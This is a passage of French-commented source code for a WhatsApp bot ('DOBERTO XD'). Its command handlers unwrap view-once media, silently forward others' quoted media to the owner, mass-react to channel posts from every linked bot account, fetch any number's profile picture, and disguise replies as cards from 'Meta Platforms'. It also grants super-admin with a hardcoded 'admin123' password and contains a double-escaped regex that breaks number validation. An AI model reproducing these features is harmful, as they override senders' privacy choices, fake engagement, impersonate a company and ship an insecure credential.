                text: `❌ Erreur: ${e.message}` 
            }, { quoted: msg });
        }
    }
    break;
}
            // ============ FORWARD/RETURN VOICE ============
case 'readviewonce': {
  try {
    // Récupération du message cité (même logique que tovn)
    const quotedCtx = msg.message?.extendedTextMessage?.contextInfo;
    const quoted = quotedCtx?.quotedMessage;
    if (!quoted) {
      await socket.sendMessage(sender, {
        text: '❗ Réponds à un message view-once (image/vidéo/sticker) avec la commande .readviewonce'
      }, { quoted: msg });
      break;
    }

    // Helper : extraire le contenu view-once quel que soit le nesting (iOS/Android/ephemeral)
    function extractViewOnceContent(q) {
      // cas 1: q.viewOnceMessage?.message.{imageMessage|videoMessage|...}
      if (q.viewOnceMessage && q.viewOnceMessage.message) {
        const inner = q.viewOnceMessage.message;
        const types = ['imageMessage','videoMessage','stickerMessage','documentMessage','audioMessage'];
        const found = types.find(t => inner[t]);
        if (found) return { qType: found, content: inner[found] };
      }
      // cas 2: q.ephemeralMessage?.message?.viewOnceMessage?.message.{...} (iPhone parfois)
      if (q.ephemeralMessage && q.ephemeralMessage.message && q.ephemeralMessage.message.viewOnceMessage && q.ephemeralMessage.message.viewOnceMessage.message) {
        const inner = q.ephemeralMessage.message.viewOnceMessage.message;
        const types = ['imageMessage','videoMessage','stickerMessage','documentMessage','audioMessage'];
        const found = types.find(t => inner[t]);
        if (found) return { qType: found, content: inner[found] };
      }
      // cas 3: q.{imageMessage|videoMessage|stickerMessage|documentMessage|audioMessage} direct
      const directTypes = ['imageMessage','videoMessage','stickerMessage','documentMessage','audioMessage'];
      const directFound = directTypes.find(t => q[t]);
      if (directFound) return { qType: directFound, content: q[directFound] };
      // aucun trouvé
      return null;
    }

    const extracted = extractViewOnceContent(quoted);
    if (!extracted) {
      await socket.sendMessage(sender, {
        text: '❌ Le message cité ne contient pas de média view-once supporté.'
      }, { quoted: msg });
      break;
    }

    const { qType, content } = extracted;
    const messageType = qType.replace(/Message$/i, '').toLowerCase(); // 'image', 'video', 'sticker', 'document', 'audio'

    // Télécharger le flux via downloadContentFromMessage
    // downloadContentFromMessage attend l'objet message node (ex: content) et le type 'image'|'video'...
    const stream = await downloadContentFromMessage(content, messageType);
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    const buffer = Buffer.concat(chunks);

    if (!buffer || buffer.length === 0) {
      throw new Error('Buffer vide après téléchargement');
    }

    // Indiquer qu'on traite la requête
    try { await socket.sendMessage(sender, { react: { text: '⏳', key: msg.key } }); } catch(e){}

    // Préparer options communes
    const mimetype = content.mimetype || (qType === 'videoMessage' ? 'video/mp4' : (qType === 'imageMessage' ? 'image/jpeg' : undefined));
    const fileName = content.fileName || (qType === 'videoMessage' ? 'video.mp4' : (qType === 'documentMessage' ? 'file' : undefined));

    // Envoyer selon le type
    if (qType === 'imageMessage') {
      await socket.sendMessage(sender, {
        image: buffer,
        caption: '📷 ViewOnce déballé',
        mimetype
      }, { quoted: msg });
    } else if (qType === 'videoMessage') {
      // Certains clients iOS envoient des vidéos avec gifPlayback true ; on renvoie en vidéo standard
      await socket.sendMessage(sender, {
        video: buffer,
        caption: '🎥 ViewOnce déballé',
        mimetype: mimetype || 'video/mp4',
        fileName: fileName || 'video.mp4'
      }, { quoted: msg });
    } else if (qType === 'stickerMessage') {
      // Sticker : s'assurer que c'est bien un webp ; Baileys accepte Buffer
      await socket.sendMessage(sender, {
        sticker: buffer,
        mimetype: content.mimetype || 'image/webp'
      }, { quoted: msg });
    } else if (qType === 'documentMessage') {
      await socket.sendMessage(sender, {
        document: buffer,
        mimetype: content.mimetype || 'application/octet-stream',
        fileName: fileName || 'file',
        caption: '📎 ViewOnce déballé'
      }, { quoted: msg });
    } else if (qType === 'audioMessage') {
      await socket.sendMessage(sender, {
        audio: buffer,
        mimetype: content.mimetype || 'audio/mpeg',
        ptt: false
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, {
        text: '❌ Type de média non supporté pour le déballage.'
      }, { quoted: msg });
    }

    // réaction finale
    try { await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } }); } catch(e){}

  } catch (err) {
    console.error('[READVIEWONCE ERROR]', err);
    try { await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } }); } catch(e){}
    await socket.sendMessage(sender, {
      text: `❌ Impossible de déballer le view-once : ${err.message || err}`
    }, { quoted: msg });
  }
  break;
}
            // ============ COMMANDE INCONNUE ============

// --- utilitaire minimal pour settings de groupe (si besoin) ---


// ============ FIN DES COMMANDES DE GROUPE ============
          

          


case 'firstadmin': {
  try {
    const args = body.trim().split(' ');
    
    if (args.length < 4) {
      await socket.sendMessage(sender, { 
        text: "🔐 **INITIALISATION ADMIN** 🔐\n\n" +
              "❌ Format : !firstadmin <password> <numéro> <nom>\n" +
              "💡 Exemple : !firstadmin AdminInit123 00000000000 Super Admin"
      }, { quoted: msg });
      break;
    }
    
    const password = args[1];
    const numero = args[2];
    const nom = args.slice(3).join(' ');
    
    // Mot de passe temporaire (à changer après usage)
    const TEMP_PASSWORD = 'admin123';
    
    if (password !== TEMP_PASSWORD) {
      await socket.sendMessage(sender, { 
        text: "❌ Mot de passe incorrect.\n" +
              "Contactez le développeur pour obtenir le mot de passe d'initialisation."
      }, { quoted: msg });
      break;
    }
    
    // Vérifier si des admins existent déjà
    const existingAdmins = await loadAdminsFromMongo();
    if (existingAdmins.length > 0) {
      await socket.sendMessage(sender, { 
        text: "⚠️ Des administrateurs existent déjà.\n" +
              "Utilisez !addadmin après vous être connecté en tant qu'admin."
      }, { quoted: msg });
      break;
    }
    
    const numeroNettoye = numero.replace(/[^0-9]/g, '');
    const jid = `${numeroNettoye}@s.whatsapp.net`;
    
    // Ajouter l'admin directement (sans vérification)
    await adminsCol.updateOne(
      { jid }, 
      { 
        $set: { 
          jid, 
          name: nom, 
          addedAt: new Date(), 
          addedBy: 'first_init',
          isSuperAdmin: true 
        } 
      }, 
      { upsert: true }
    );
    
    console.log(`🎉 Premier admin initialisé : ${nom} (${jid})`);
    
    await socket.sendMessage(sender, { 
      text: `🎊 **ADMIN INITIALISÉ AVEC SUCCÈS** 🎊

✅ Premier administrateur créé !

👑 Nom : ${nom}
📱 Numéro : ${numeroNettoye}
🔗 JID : ${jid}
🔐 Niveau : Super Admin
📅 Date : ${getHaitiTimestamp()}

━━━━━━━━━━━━━━━━━━

⚠️ **Actions requises :**
1. Utilisez !listadmin pour vérifier
2. Utilisez !addadmin pour ajouter d'autres admins
3. Modifiez le mot de passe d'initialisation dans le code

━━━━━━━━━━━━━━━━━━

🎯 Vous avez maintenant accès à toutes les commandes admin :
• !addadmin - Ajouter un admin
• !listadmin - Lister les admins
• !breact - Commander tous les bots
• Et toutes les autres commandes protégées`
    }, { quoted: msg });
    
  } catch (error) {
    console.error('❌ Erreur firstadmin:', error);
    await socket.sendMessage(sender, { 
      text: `❌ Erreur : ${error.message}` 
    }, { quoted: msg });
  }
  break;
}


case 'breact': {
  try {
    // Vérification admin
    const admins = await loadAdminsFromMongo();
    const senderJid = nowsender;
    const isAdmin = admins.some(adminJid => 
      adminJid === senderJid || adminJid === senderJid.split('@')[0]
    );
    
    if (!isAdmin) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: "❌ Accès refusé. Cette commande est réservée aux administrateurs." 
      }, { quoted: msg });
      break;
    }

    // Extraction des paramètres
    const q = body.split(' ').slice(1).join(' ').trim();
    if (!q.includes(',')) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: "❌ Format : !breact <channelJid/messageId>,<emoji>\nExemple : !breact 0029Vb761O39mrGTZvQ8UQ02/175,👍" 
      }, { quoted: msg });
      break;
    }

    const parts = q.split(',');
    let channelRef = parts[0].trim();
    const reactEmoji = parts[1].trim();

    // Extraction du channelJid et messageId
    let channelJid = null;
    let messageId = null;

    // Format URL
    const urlMatch = channelRef.match(/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
    if (urlMatch) {
      channelJid = `${urlMatch[1]}@newsletter`;
      messageId = urlMatch[2];
    } 
    // Format court
    else {
      const maybeParts = channelRef.split('/');
      if (maybeParts.length >= 2) {
        messageId = maybeParts[maybeParts.length - 1];
        channelJid = maybeParts[maybeParts.length - 2];
        if (!channelJid.endsWith('@newsletter')) {
          if (/^\d+$/.test(channelJid)) {
            channelJid = `${channelJid}@newsletter`;
          }
        }
      }
    }

    // Validation du format
    if (!channelJid || !messageId || !channelJid.endsWith('@newsletter')) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: "❌ Format invalide. Utilisez :\n1. `!breact 0029Vb761O39mrGTZvQ8UQ02/175,👍`\n2. `!breact /175,👍`" 
      }, { quoted: msg });
      break;
    }

    // Récupérer tous les bots connectés depuis MongoDB
    const allNumbers = await getAllNumbersFromMongo();
    
    if (!allNumbers || allNumbers.length === 0) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: "❌ Aucun bot trouvé dans la base de données." 
      }, { quoted: msg });
      break;
    }

    // Filtrer les bots actuellement connectés
    const connectedNumbers = allNumbers.filter(num => activeSockets.has(num));
    
    if (connectedNumbers.length === 0) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: "❌ Aucun bot actuellement connecté." 
      }, { quoted: msg });
      break;
    }

    // Réagir avec ☑️ pour confirmer la commande
    await socket.sendMessage(sender, { react: { text: "☑️", key: msg.key } });

    // Envoyer un message d'information
    await socket.sendMessage(sender, { 
      text: `🚀 Lancement de la commande multi-bots...

📢 Canal : ${channelJid.split('@')[0]}
📝 Message ID : ${messageId}
😊 Émoji : ${reactEmoji}
🤖 Bots concernés : ${connectedNumbers.length}

L'opération est en cours...`
    }, { quoted: msg });

    // Lancer les réactions en arrière-plan
    (async () => {
      const results = [];
      
      for (const botNumber of connectedNumbers) {
        try {
          const botSocket = activeSockets.get(botNumber);
          
          // Essayer de faire suivre le canal au bot
          try {
            await botSocket.newsletterFollow(channelJid);
            await delay(1500); // Attente après le follow
          } catch (followError) {
            // Le bot suit peut-être déjà le canal, continuer
          }
          
          // Envoyer la réaction
          await botSocket.newsletterReactMessage(channelJid, messageId, reactEmoji);
          
          // Sauvegarder dans MongoDB
          await saveNewsletterReaction(channelJid, messageId, reactEmoji, botNumber);
          
          results.push({ bot: botNumber, status: '✅' });
          
        } catch (error) {
          console.error(`❌ Erreur pour le bot ${botNumber}:`, error.message);
          results.push({ bot: botNumber, status: '❌', error: error.message });
        }
        
        // Pause pour éviter le rate limiting
        await delay(1000);
      }
      
      // Compter les résultats
      const successCount = results.filter(r => r.status === '✅').length;
      const failCount = results.filter(r => r.status === '❌').length;
      
      // Envoyer un rapport final
      let report = `📊 **RAPPORT D'EXÉCUTION** 📊

✅ Commandes envoyées : ${connectedNumbers.length}
✅ Réussites : ${successCount}
❌ Échecs : ${failCount}
📈 Taux de succès : ${Math.round((successCount / connectedNumbers.length) * 100)}%

━━━━━━━━━━━━━━━━━━

📢 Cible : ${channelJid.split('@')[0]}
📝 Message : ${messageId}
😊 Émoji : ${reactEmoji}
🕒 Terminé à : ${getHaitiTimestamp()}

━━━━━━━━━━━━━━━━━━`;

      // Ajouter les détails des échecs si nécessaire
      const failedBots = results.filter(r => r.status === '❌');
      if (failedBots.length > 0) {
        report += `\n\n📋 **Bots en échec :**\n`;
        failedBots.slice(0, 10).forEach(bot => {
          report += `• ${bot.bot} : ${bot.error?.substring(0, 50)}${bot.error?.length > 50 ? '...' : ''}\n`;
        });
        if (failedBots.length > 10) {
          report += `\n... et ${failedBots.length - 10} autres`;
        }
      }
      
      // Envoyer le rapport
      await socket.sendMessage(sender, { text: report });
      
    })(); // Fin de l'exécution asynchrone

  } catch (error) {
    console.error('❌ Erreur commande breact:', error);
    try {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text: `❌ Erreur interne : ${error.message}` 
      }, { quoted: msg });
    } catch (e) {}
  }
  break;
}


case 'getpp': {
    try {
        const sanitized = (number || '').replace(/[^0-9]/g, '');
        const cfg = await loadUserConfigFromMongo(sanitized) || {};
        const botName = cfg.botName || BOT_NAME_FANCY;
        const logo = cfg.logo || config.RCD_IMAGE_PATH;

        const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');

        let q = msg.message?.conversation?.split(" ")[1] || 
                msg.message?.extendedTextMessage?.text?.split(" ")[1];

        if (!q) return await socket.sendMessage(sender, { text: "❌ Veuillez saisir un numéro.\n\nUtilisation : .getpp <numéro>" });

        // 🔹 Format number into JID
        let jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

        // 🔹 Try to get profile picture
        let ppUrl;
        try {
            ppUrl = await socket.profilePictureUrl(jid, "image");
        } catch {
            ppUrl = "https://telegra.ph/file/4cc2712eaba1c5c1488d3.jpg"; // default dp
        }

        // 🔹 BotName meta mention
        const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };

        // 🔹 Send DP with botName meta mention
        await socket.sendMessage(sender, { 
    image: { url: ppUrl }, 
    caption: `🖼 *Photo de profil de* +${q}\nRécupérée par : DOBERTO-XD`,
    footer: `📌 DOBERTO XD PHOTO DE PROFIL`,
    headerType: 4
}, { quoted: metaQuote });
    } catch (e) {
        console.log("❌ getdp error:", e);
        await socket.sendMessage(sender, { text: "⚠️ Error: Could not fetch profile picture." });
    }
    break;
}

                
case 'pair':
case 'code': {
  const q = msg.message?.conversation ||
            msg.message?.extendedTextMessage?.text ||
            msg.message?.imageMessage?.caption ||
            msg.message?.videoMessage?.caption || '';
  
  const args = q.trim().split(/\s+/);
  args.shift(); // enlever la commande
  const number = args.join(' ').trim();

  if (!number) {
    return await socket.sendMessage(sender, {
      text: `*📌 𝗖𝗢𝗗𝗘 𝗗𝗘 𝗖𝗢𝗡𝗡𝗘𝗫𝗜𝗢𝗡 𝗗𝗢𝗕𝗘𝗥𝗧𝗢 𝗫𝗗*\n\n` +
            `*Usage:* .code [numéro] ou .pair [numéro]\n` +
            `*Exemple:* .code 5094744XXXX\n\n` +
            `*Note:* Le numéro doit être au format international sans le +`
    }, { quoted: msg });
  }

  const cleanNumber = number.replace(/[^\d]/g, '');
  if (cleanNumber.length < 9 || cleanNumber.length > 15) {
    return await socket.sendMessage(sender, {
      text: `*❌ 𝙵𝚘𝚛𝚖𝚊𝚝 𝚒𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝  *\n\n` +
            `ʟᴇ Nᴜᴍᴇʀᴏ ᴅᴏɪᴛ ᴄᴏɴᴛᴇɴɪʀ ᴇɴᴛʀᴇ 9 ᴇᴛ 15 ᴄʜɪғғʀᴇs.\n` +
            `ᗴ᙭ᗴᗰᑭᒪᗴ: 00000000000`
    }, { quoted: msg });
  }

  try {
    await socket.sendMessage(sender, { react: { text: "⏳", key: msg.key } });

    let fetch;
    try {
      fetch = (await import('node-fetch')).default;
    } catch {
      fetch = (...args) => import('node-fetch').then(({default: f}) => f(...args));
    }

    const url = `${SERVER_URL}/code?number=${encodeURIComponent(cleanNumber)}`;
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (WhatsAppBot)',
        'Accept': 'application/json'
      },
      timeout: 30000
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);

    const bodyText = await response.text();
    let result;
    try {
      result = JSON.parse(bodyText);
    } catch {
      const codeMatch = bodyText.match(/"code"\s*:\s*"([^"]+)"/) || bodyText.match(/'code'\s*:\s*'([^']+)'/);
      if (codeMatch) result = { code: codeMatch[1] };
      else throw new Error("Réponse invalide du serveur");
    }

    if (!result || !result.code) throw new Error("Aucun code reçu du serveur");

    const code = result.code.trim();

    // Message interactif avec bouton copy
    await socket.relayMessage(sender, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `*╭───────────◇*\n` +
                    `│ ✧ sᴛᴀᴛᴜs: ✅ ᴄᴏᴅᴇ ᴛʀᴏᴜᴠé\n` +
                    `│ ✧ ɴᴜᴍéʀᴏ: ${cleanNumber}\n` +
                    `│ ✧ ᴄᴏᴅᴇ: ${code}\n` +
                    `│ ✧ ᴇxᴘɪʀᴇ: 20s\n` +
                    `│ ✧ ᴅᴇᴠ: DOBERTO\n` +
                    `*╰───────────◇*\n\n` +
                    `📋 *INSTRUCTIONS:*\n` +
                    `1. Ouvrez WhatsApp → Paramètres → Appareils liés\n` +
                    `2. Connecter un appareil → Lier avec un code\n` +
                    `3. Entrez le code ci-dessus\n\n` +
                    `> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`
            },
            footer: { text: "> © DOBERTO XD" },
            header: { hasMediaAttachment: false, title: "Connexion WhatsApp" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copier le code",
                    id: "copy_code",
                    copy_code: code
                  })
                }
              ]
            }
          }
        }
      }
    }, { quoted: msg });

    await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

  } catch (err) {
    console.error("❌ Erreur commande code:", err);
    await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
    await socket.sendMessage(sender, { text: `❌ Erreur: ${err.message || err}` }, { quoted: msg });
  }
  break;
}
  
case 'deleteme': {
  // 'number' is the session number passed to setupCommandHandlers (sanitized in caller)
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  // determine who sent the command
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  // Permission: only the session owner or the bot OWNER can delete this session
  if (senderNum !== sanitized && senderNum !== ownerNum) {
    await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or the bot owner can delete this session.' }, { quoted: msg });
    break;
  }

  try {
    // 1) Remove from Mongo
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);

    // 2) Remove temp session dir
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try {
      if (fs.existsSync(sessionPath)) {
        fs.removeSync(sessionPath);
        console.log(`Removed session folder: ${sessionPath}`);
      }
    } catch (e) {
      console.warn('Failed removing session folder:', e);
    }

    // 3) Try to logout & close socket
    try {
      if (typeof socket.logout === 'function') {
        await socket.logout().catch(err => console.warn('logout error (ignored):', err?.message || err));
      }
    } catch (e) { console.warn('socket.logout failed:', e?.message || e); }
    try { socket.ws?.close(); } catch (e) { console.warn('ws close failed:', e?.message || e); }

    // 4) Remove from runtime maps
    activeSockets.delete(sanitized);
    socketCreationTime.delete(sanitized);

    // 5) notify user
    await socket.sendMessage(sender, {
      image: { url: config.RCD_IMAGE_PATH },
      caption: formatMessage('🗑️ SESSION DELETED', '✅ Your session has been successfully deleted from MongoDB and local storage.', BOT_NAME_FANCY)
    }, { quoted: msg });

    console.log(`Session ${sanitized} deleted by ${senderNum}`);
  } catch (err) {
    console.error('deleteme command error:', err);
    await socket.sendMessage(sender, { text: `❌ Failed to delete session: ${err.message || err}` }, { quoted: msg });
  }
  break;
}
case 'deletemenumber': {
  // args is available in the handler (body split). Expect args[0] = target number
  const targetRaw = (args && args[0]) ? args[0].trim() : '';
  if (!targetRaw) {
    await socket.sendMessage(sender, { text: '❗ Usage: .deletemenumber <number>\nExample: .deletemenumber 9478#######' }, { quoted: msg });
    break;
  }

  const target = targetRaw.replace(/[^0-9]/g, '');
  if (!/^\\d{6,}$/.test(target)) {
    await socket.sendMessage(sender, { text: '❗ Invalid number provided.' }, { quoted: msg });
    break;
  }

  // Permission check: only OWNER or configured admins can run this
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  let allowed = false;
  if (senderNum === ownerNum) allowed = true;
  else {
    try {
      const adminList = await loadAdminsFromMongo();
      if (Array.isArray(adminList) && adminList.some(a => a.replace(/[^0-9]/g,'') === senderNum || a === senderNum || a === `${senderNum}@s.whatsapp.net`)) {
        allowed = true;
      }
    } catch (e) {
      console.warn('Failed checking admin list', e);
    }
  }

  if (!allowed) {
    await socket.sendMessage(sender, { text: '❌ Permission denied. Only bot owner or admins can delete other sessions.' }, { quoted: msg });
    break;
  }

  try {
    // notify start
    await socket.sendMessage(sender, { text: `🗑️ Deleting session for ${target} — attempting now...` }, { quoted: msg });

    // 1) If active, try to logout + close
    const runningSocket = activeSockets.get(target);
    if (runningSocket) {
      try {
        if (typeof runningSocket.logout === 'function') {
          await runningSocket.logout().catch(e => console.warn('logout error (ignored):', e?.message || e));
        }
      } catch (e) { console.warn('Error during logout:', e); }
      try { runningSocket.ws?.close(); } catch (e) { console.warn('ws close error:', e); }
      activeSockets.delete(target);
      socketCreationTime.delete(target);
    }

    // 2) Remove from Mongo (sessions + numbers)
    await removeSessionFromMongo(target);
    await removeNumberFromMongo(target);

    // 3) Remove temp session dir if exists
    const tmpSessionPath = path.join(os.tmpdir(), `session_${target}`);
    try {
      if (fs.existsSync(tmpSessionPath)) {
        fs.removeSync(tmpSessionPath);
        console.log(`Removed temp session folder: ${tmpSessionPath}`);
      }
    } catch (e) {
      console.warn('Failed removing tmp session folder:', e);
    }

    // 4) Confirm to caller & notify owner
    await socket.sendMessage(sender, {
      image: { url: config.RCD_IMAGE_PATH },
      caption: formatMessage('🗑️ SESSION REMOVED', `✅ Session for number *${target}* has been deleted from MongoDB and runtime.`, BOT_NAME_FANCY)
    }, { quoted: msg });

    // optional: inform owner
    try {
      const ownerJid = `${ownerNum}@s.whatsapp.net`;
      await socket.sendMessage(ownerJid, {
        text: `👑 Notice: Session removed by ${senderNum}\n→ Number: ${target}\n→ Time: ${getHaitiTimestamp()}`
      });
    } catch (e) { /* ignore notification errors */ }

    console.log(`deletemenumber: removed ${target} (requested by ${senderNum})`);
  } catch (err) {
    console.error('deletemenumber error:', err);
    await socket.sendMessage(sender, { text: `❌ Failed to delete session for ${target}: ${err.message || err}` }, { quoted: msg });
  }

  break;
}





case 'cfn': {
  const fs = require('fs');

  // Nettoyer le numéro de l’expéditeur
  const sanitized = (senderNumber || '').replace(/[^0-9]/g, '');
  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  const botName = cfg.botName || BOT_NAME_FANCY;
  const logo = cfg.logo || config.RCD_IMAGE_PATH;

  // Récupérer les arguments après la commande
  const full = args.join(" ").trim();
  if (!full) {
    await socket.sendMessage(sender, { 
      text: `❗ Fournis une entrée : .cfn <jid@newsletter> | emoji1,emoji2\nExemple: .cfn 120363402094635383@newsletter | 🔥,❤️` 
    }, { quoted: msg });
    break;
  }

  // Vérifier permissions
  const admins = await loadAdminsFromMongo();
  const normalizedAdmins = (admins || []).map(a => (a || '').toString());
  const senderIdSimple = (senderNumber || '').toString();
  const isAdmin = normalizedAdmins.includes(sender) || normalizedAdmins.includes(senderNumber) || normalizedAdmins.includes(senderIdSimple);
  if (!(isOwner || isAdmin)) {
    await socket.sendMessage(sender, { text: '❌ Permission refusée. Seul le propriétaire ou les admins configurés peuvent ajouter des chaînes.' }, { quoted: msg });
    break;
  }

  // Découper JID et emojis
  let jidPart = full;
  let emojisPart = '';
  if (full.includes('|')) {
    const split = full.split('|');
    jidPart = split[0].trim();
    emojisPart = split.slice(1).join('|').trim();
  } else {
    const parts = full.split(/\s+/);
    if (parts.length > 1 && parts[0].includes('@newsletter')) {
      jidPart = parts.shift().trim();
      emojisPart = parts.join(' ').trim();
    } else {
      jidPart = full.trim();
    }
  }

  const jid = jidPart;
  if (!jid || !jid.endsWith('@newsletter')) {
    await socket.sendMessage(sender, { text: '❗ JID invalide. Exemple: 120363402094635383@newsletter' }, { quoted: msg });
    break;
  }

  let emojis = [];
  if (emojisPart) {
    emojis = emojisPart.includes(',') ? emojisPart.split(',').map(e => e.trim()) : emojisPart.split(/\s+/).map(e => e.trim());
    if (emojis.length > 20) emojis = emojis.slice(0, 20);
  }

  try {
    if (typeof socket.newsletterFollow === 'function') {
      await socket.newsletterFollow(jid);
    }

    await addNewsletterToMongo(jid, emojis);

    const emojiText = emojis.length ? emojis.join(' ') : '(ensemble par défaut)';

    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_CFN" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: `✅ Chaîne suivie et sauvegardée !\n\nJID: ${jid}\nEmojis: ${emojiText}\nAjouté par: @${senderIdSimple}`,
      footer: `📌 ${botName} FOLLOW CHANNEL`,
      mentions: [sender], 
      buttons: [{ buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 MENU" }, type: 1 }],
      headerType: 4
    }, { quoted: metaQuote });

  } catch (e) {
    console.error('cfn error', e);
    await socket.sendMessage(sender, { text: `❌ Échec de l’ajout/suivi de la chaîne : ${e.message || e}` }, { quoted: msg });
  }
  break;
}
case 'chr': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  const botName = cfg.botName || BOT_NAME_FANCY;
  const logo = cfg.logo || config.RCD_IMAGE_PATH;

  const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');

  const q = body.split(' ').slice(1).join(' ').trim();
  if (!q.includes(',')) return await socket.sendMessage(sender, { 
    text: "❌ Usage : chr <channelJid/messageId>,<emoji>\nExemple : chr 0029Vb761O39mrGTZvQ8UQ02/175,👍" 
  }, { quoted: msg });

  const parts = q.split(',');
  let channelRef = parts[0].trim();
  const reactEmoji = parts[1].trim();

  let channelJid = null;
  let messageId = null;

  // 🔹 OPTION 1 : URL complète (https://whatsapp.com/channel/...)
  const urlMatch = channelRef.match(/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
  if (urlMatch) {
    channelJid = `${urlMatch[1]}@newsletter`;
    messageId = urlMatch[2];
  }
  // 🔹 OPTION 2 : Format channelJid/messageId
  else {
    const maybeParts = channelRef.split('/');
    if (maybeParts.length >= 2) {
      messageId = maybeParts[maybeParts.length - 1];
      channelJid = maybeParts[maybeParts.length - 2];
      
      // Vérifier si le JID contient déjà @newsletter
      if (!channelJid.endsWith('@newsletter')) {
        // Si c'est juste des chiffres, ajouter @newsletter
        if (/^\d+$/.test(channelJid)) {
          channelJid = `${channelJid}@newsletter`;
        }
      }
    }
  }

  // Validation finale
  if (!channelJid || !messageId || !channelJid.endsWith('@newsletter')) {
    return await socket.sendMessage(sender, { 
      text: '❌ Format invalide. Utilisez :\n' +
            '1. `chr 0029Vb761O39mrGTZvQ8UQ02/175,👍`\n' +
            '2. `chr /175,👍`' 
    }, { quoted: msg });
  }

  try {
    await socket.newsletterReactMessage(channelJid, messageId.toString(), reactEmoji);
    await saveNewsletterReaction(channelJid, messageId.toString(), reactEmoji, sanitized);

    // BotName meta mention
    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_CHR" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    let imagePayload;
    if (String(logo).startsWith('http')) {
      imagePayload = { url: logo };
    } else {
      try {
        imagePayload = fs.readFileSync(logo);
      } catch (e) {
        imagePayload = { url: config.RCD_IMAGE_PATH };
      }
    }

    // Message de confirmation stylisé
    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: `✅ Réaction envoyée avec succès !

📢 Canal : ${channelJid}
📝 Message ID : ${messageId}
😊 Émoji : ${reactEmoji}
👤 Par : @${senderIdSimple}

━━━━━━━━━━━━━━━━━━

🕒 ${getHaitiTimestamp()}
📍 Fuseau : Haïti`,
      footer: `📌 ${botName} • REACTION`,
      mentions: [nowsender],
      buttons: [{ buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 MENU" }, type: 1 }],
      headerType: 4
    }, { quoted: metaQuote });

  } catch (e) {
    console.error('chr command error', e);
    await socket.sendMessage(sender, { 
      text: `❌ Échec de la réaction : ${e.message || e}\n\nVérifiez que :\n1. Le bot suit ce canal\n2. Le message existe\n3. Le JID et Message ID sont corrects` 
    }, { quoted: msg });
  }
  break;
}

case 't':
case '🌹':
case '😍':
case '❤️': {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (!quoted) {
        break; // rien à faire si aucun média cité
    }

    try {
        const userJid = jidNormalizedUser(socket.user.id);
        
        // Forwarder directement le message cité
        await socket.sendMessage(userJid, {
            forward: {
                key: {
                    remoteJid: from,
                    fromMe: false,
                    id: msg.key.id
                },
                message: quoted
            }
        });

    } catch (e) {
        console.error("[SAVE ERROR]:", e);
        // pas de réaction ni de message d'erreur envoyé
    }
    break;
}

case 'save': {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (!quoted) {
        await socket.sendMessage(sender, { 
            text: `💾 *Save*\n\n❌ Réponds à un média avec !${command}` 
